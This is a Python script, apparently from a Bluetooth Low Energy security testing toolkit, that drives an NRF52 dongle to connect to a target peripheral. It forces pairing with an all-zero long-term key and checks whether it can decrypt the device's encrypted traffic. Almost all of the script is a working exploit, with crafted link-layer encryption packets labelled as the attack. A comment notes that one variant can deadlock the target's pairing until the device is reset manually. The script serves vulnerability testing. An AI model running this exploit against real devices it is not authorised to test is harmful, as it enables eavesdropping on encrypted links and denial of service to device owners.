#!/usr/bin/python 
import os
import platform
import sys
from binascii import hexlify
from time import sleep

# extra libs
sys.path.insert(0, os.getcwd() + '/libs')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import *
from scapy.utils import raw
from timeout_lib import start_timeout, disable_timeout, update_timeout
from Crypto.Cipher import AES

# Default master address
master_address = '5d:36:ac:90:0b:20'
access_address = 0x9a328370
# Normal pairing request for secure pairing (uncomment the following to choose pairing request method)
# pairing_iocap = 0x01  # DisplayYesNo
# pairing_iocap = 0x03  # NoInputNoOutput
pairing_iocap = 0x04  # KeyboardDisplay
# paring_auth_request = 0x00  # No bounding
# paring_auth_request = 0x01  # Bounding
paring_auth_request = 0x08 | + 0x01  # Le Secure Connection + bounding
# paring_auth_request = 0x04 | 0x01  # MITM + bounding
# paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bounding

# Internal vars
SCAN_TIMEOUT = 2
CRASH_TIMEOUT = 7
none_count = 0
end_connection = False
connecting = False
conn_skd = None
conn_iv = None
conn_ltk = None
conn_tx_packet_counter = 0
conn_rx_packet_counter = 0
encryption_enabled = False
slave_addr_type = 0
smp_retries = 0
run_script = True
# l2cap reassembly
fragment_start = False
fragment_left = 0
fragment = None

# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
if len(sys.argv) >= 2:
    serial_port = sys.argv[1]
elif platform.system() == 'Linux':
    serial_port = '/dev/ttyACM0'
elif platform.system() == 'Windows':
    serial_port = 'COM1'
else:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 3:
    advertiser_address = sys.argv[2].upper()
else:
    advertiser_address = 'A4:C1:38:D8:AD:B8'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())


def crash_timeout():
    print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
          ' received\nThe device may have crashed!!!')
    disable_timeout('scan_timeout')


def scan_timeout():
    global connecting, slave_addr_type
    connecting = False
    scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
        ScanA=master_address,
        AdvA=advertiser_address)
    driver.send(scan_req)
    start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)


def smp_timeout():
    global smp_retries, run_script
    print(Fore.YELLOW + '-----------------------------------------------------------------------')
    print(Fore.GREEN + 'Peripheral is not answering a SMP/ENC request. This is a good indication')
    if smp_retries < 5:
        print(Fore.YELLOW + 'Retrying...')
        smp_retries += 1
        scan_timeout()
    else:
        run_script = False


def set_security_settings(pkt):
    global paring_auth_request
    # Change security parameters according to slave security request
    # paring_auth_request = pkt[SM_Security_Request].authentication
    print(Fore.YELLOW + 'Slave requested authentication of ' + hex(pkt[SM_Security_Request].authentication))
    print(Fore.YELLOW + 'We are using authentication of ' + hex(paring_auth_request))


def bt_crypto_e(key, plaintext):
    aes = AES.new(key, AES.MODE_ECB)
    return aes.encrypt(plaintext)


def send_encrypted(pkt):
    global access_address, conn_tx_packet_counter
    try:
        raw_pkt = bytearray(raw(pkt))
        access_address = raw_pkt[:4]
        header = raw_pkt[4]  # Get ble header
        length = raw_pkt[5] + 4  # add 4 bytes for the mic
        crc = '\x00\x00\x00'  # Dummy CRC (Dongle automatically calculates it)

        pkt_count = bytearray(struct.pack("<Q", conn_tx_packet_counter)[:5])  # convert only 5 bytes
        pkt_count[4] |= 0x80  # Set for master -> slave
        nonce = pkt_count + conn_iv

        aes = AES.new(conn_session_key, AES.MODE_CCM, nonce=nonce, mac_len=4)  # mac = mic
        aes.update(chr(header & 0xE3))  # Calculate mic over header cleared of NES, SN and MD

        enc_pkt, mic = aes.encrypt_and_digest(raw_pkt[6:-3])  # get payload and exclude 3 bytes of crc
        conn_tx_packet_counter += 1  # Increment packet counter
        driver.raw_send(access_address + chr(header) + chr(length) + enc_pkt + mic + crc)
        print(Fore.CYAN + "TX ---> [Encrypted]{" + pkt.summary()[7:] + '}')
    except Exception as e:
        print(Fore.RED + "Encryption problem: " + e)


def receive_encrypted(pkt):
    global access_address, conn_rx_packet_counter
    raw_pkt = bytearray(raw(pkt))
    access_address = raw_pkt[:4]
    header = raw_pkt[4]  # Get ble header
    length = raw_pkt[5]  # add 4 bytes for the mic

    if length is 0 or length < 5:
        # ignore empty PDUs
        return pkt
    # Subtract packet length 4 bytes of MIC
    length -= 4
    # Update nonce before decrypting
    pkt_count = bytearray(struct.pack("<Q", conn_rx_packet_counter)[:5])  # convert only 5 bytes
    pkt_count[4] &= 0x7F  # Clear bit 7 for slave -> master
    nonce = pkt_count + conn_iv

    aes = AES.new(conn_session_key, AES.MODE_CCM, nonce=nonce, mac_len=4)  # mac = mic
    aes.update(chr(header & 0xE3))  # Calculate mic over header cleared of NES, SN and MD

    dec_pkt = aes.decrypt(raw_pkt[6:-4 - 3])  # get payload and exclude 3 bytes of crc
    conn_rx_packet_counter += 1
    try:
        mic = raw_pkt[6 + length: -3]  # Get mic from payload and exclude crc
        aes.verify(mic)

        return BTLE(access_address + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')
    except Exception as e:
        print(Fore.RED + "MIC Wrong: " + e)
        return BTLE(access_address + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')


def defragment_l2cap(pkt):
    global fragment, fragment_start, fragment_left
    # Handle L2CAP fragment
    if L2CAP_Hdr in pkt and pkt[L2CAP_Hdr].len + 4 > pkt[BTLE_DATA].len:
        fragment_start = True
        fragment_left = pkt[L2CAP_Hdr].len
        fragment = raw(pkt)[:-3]
        return None
    elif fragment_start and BTLE_DATA in pkt and pkt[BTLE_DATA].LLID == 0x01:
        fragment_left -= pkt[BTLE_DATA].len + 4
        fragment += raw(pkt[BTLE_DATA].payload)
        if pkt[BTLE_DATA].len >= fragment_left:
            fragment_start = False
            pkt = BTLE(fragment + '\x00\x00\x00')
            pkt.len = len(pkt[BTLE_DATA].payload)  # update ble header length
            return pkt
        else:
            return None
    else:
        fragment_start = False
        return pkt


# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename='zero_ltk_capture.pcap')
# Send scan request
scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
driver.send(scan_req)

start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while run_script:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        if encryption_enabled:
            pkt = BTLE(data)
            pkt = receive_encrypted(pkt)  # Decrypt Link Layer
        else:
            pkt = BTLE(data)  # Receive plain text Link Layer
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
            update_timeout('scan_timeout')
            # Print slave data channel PDUs summary
            print(Fore.MAGENTA + "RX <--- " + pkt.summary()[7:])
        elif BTLE_DATA in pkt:
            update_timeout('scan_timeout')
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower() and connecting == False:
            connecting = True
            update_timeout('scan_timeout')
            disable_timeout('crash_timeout')
            conn_rx_packet_counter = 0
            conn_tx_packet_counter = 0
            encryption_enabled = False
            slave_addr_type = pkt.TxAdd
            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
            # Send connection request to advertiser
            conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=1,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms (any)
                chM=0x1FFFFFFFFF,  # Any
                hop=5,  # Hop increment (any)
                SCA=0,  # Clock tolerance
            )
            # Yes, we're sending raw link layer messages in Python. Don't tell Bluetooth SIG as this is forbidden by
            # them!!!
            driver.send(conn_request)

        elif BTLE_DATA in pkt and connecting == True:
            connecting = False
            print(Fore.GREEN + 'Slave Connected (Link Layer data channel established)')
            if SM_Security_Request in pkt:
                set_security_settings(pkt)
            # Send Feature request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ(
                feature_set='le_encryption+le_data_len_ext')
            driver.send(pkt)

        elif SM_Security_Request in pkt:
            set_security_settings(pkt)

        elif LL_FEATURE_RSP in pkt:
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
            driver.send(pkt)

        elif LL_LENGTH_RSP in pkt or LL_UNKNOWN_RSP in pkt:
            pkt = BTLE(access_addr=access_address) / \
                  BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Exchange_MTU_Request(mtu=247)
            driver.send(pkt)

        elif ATT_Exchange_MTU_Response in pkt:
            # Send version indication request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
            driver.send(pkt)

        elif LL_VERSION_IND in pkt:
            pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
                iocap=pairing_iocap,
                oob=0,
                authentication=paring_auth_request,
                max_key_size=16,
                initiator_key_distribution=0x07,
                responder_key_distribution=0x07)
            driver.send(pairing_req)

        # THE ATTACK STARTS HERE !!!!
        elif SM_Pairing_Response in pkt:
            # Check if peripheral accepted secure connections pairing
            if not (pkt.authentication & 0x08):
                print(Fore.RED + 'Peripheral does not accept Secure Connections pairing\nEnding Test...')
                run_script = False
                end_connection = True

            start_timeout('smp_timeout', SCAN_TIMEOUT, smp_timeout)
            # Pairing request accepted
            # ediv and rand are 0 on first time pairing
            conn_iv = '\x00' * 4  # set IVm (IV of master)
            conn_skd = '\x00' * 8  # set SKDm (session key diversifier part of master)
            enc_request = BTLE(
                access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ(ediv='\x00',
                                                                                   rand='\x00',
                                                                                   skdm=conn_iv,
                                                                                   ivm=conn_skd)
            driver.send(enc_request)  # Send the malicious packet (2/2)

        elif LL_ENC_RSP in pkt:
            update_timeout('smp_timeout')
            # Get IVs and SKDs from slave encryption response
            conn_skd += pkt[LL_ENC_RSP].skds  # SKD = SKDm || SKDs
            conn_iv += pkt[LL_ENC_RSP].ivs  # IV = IVm || IVs
            conn_ltk = '\x00' * 16  # Link Layer Key (This is the key value for the attack)
            conn_session_key = bt_crypto_e(conn_ltk[::-1], conn_skd[::-1])
            conn_packet_counter = 0
            print(Fore.GREEN + 'Received SKD: ' + hexlify(conn_skd))
            print(Fore.GREEN + 'Received  IV: ' + hexlify(conn_iv))
            print(Fore.GREEN + 'Assumed  LTK: ' + hexlify(conn_ltk))
            print(Fore.GREEN + 'AES-CCM  Key: ' + hexlify(conn_session_key))


        # Slave will send LL_ENC_RSP before the LL_START_ENC_RSP
        elif LL_START_ENC_REQ in pkt:
            disable_timeout('smp_timeout')
            print(Fore.YELLOW + 'Received encryption request start from peripheral during the pairing procedure!!!')
            print(Fore.YELLOW + 'This means that the peripheral is using some unknown LTK here (informed its SMP)')
            # Encryption setup procedure accepted
            # Disconnecting here (end_connection = True) causes peripheral to deadlock SMP to not perform
            # further pairings. Peripheral SMP gets back to normal after user restarts manually the device
            # end_connection = True # (Uncomment here)
            encryption_enabled = True
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_START_ENC_RSP()
            send_encrypted(pkt)

        elif LL_START_ENC_RSP in pkt:
            print(
                    Fore.RED + 'Oooops, we were able to decrypt an encrypted response from the peripheral using a zero LTK\n'
                               'Zero LTK vulnerability is present. Check the zero_ltk.pcpap file for more information')
            end_connection = True
            driver.save_pcap()
            exit(0)

        elif LL_REJECT_IND in pkt or SM_Failed in pkt:
            print(Fore.GREEN + 'Slave rejected attack. You are safe!')
            end_connection = True
            run_script = False

        if end_connection == True:
            end_connection = False
            encryption_enabled = False
            scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
                ScanA=master_address,
                AdvA=advertiser_address)
            print(Fore.YELLOW + 'Connection reset, malformed packets were sent')

            print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
            driver.send(scan_req)
            start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)

    sleep(0.01)

print(Fore.YELLOW + 'Script ended')
